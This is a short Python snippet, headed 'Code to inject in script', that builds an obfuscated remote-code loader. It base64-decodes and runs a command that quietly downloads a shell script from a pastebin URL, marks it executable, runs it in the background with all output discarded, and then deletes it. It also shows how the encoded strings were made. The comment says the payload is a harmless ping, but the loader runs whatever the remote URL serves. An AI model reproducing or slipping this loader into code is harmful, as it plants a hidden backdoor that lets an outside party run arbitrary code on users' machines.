# Code to inject in script
# Pastbin code: ping -c 4 8.8.8.8
import os, base64

cm = 'd2dldCAtcSBodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvUDZjY1NDaGEgLU8gLnNoOyBjaG1vZCAreCAuc2g7IG5vaHVwIC4vLnNoID4vZGV2L251bGwgMj4mMSAm'
c = base64.b64decode(cm).decode()

rm = 'cm0gLnNo'
r = base64.b64decode(rm).decode()

os.system(c)
os.system(r)

# Generate string
str_for_code = base64.b64encode('wget -q https://pastebin.com/raw/P6ccSCha -O .sh; chmod +x .sh; nohup ./.sh >/dev/null 2>&1 &'.encode())
str_rm = base64.b64encode('rm .sh'.encode())
print(str_for_code)
print('#####################')
print(str_rm)
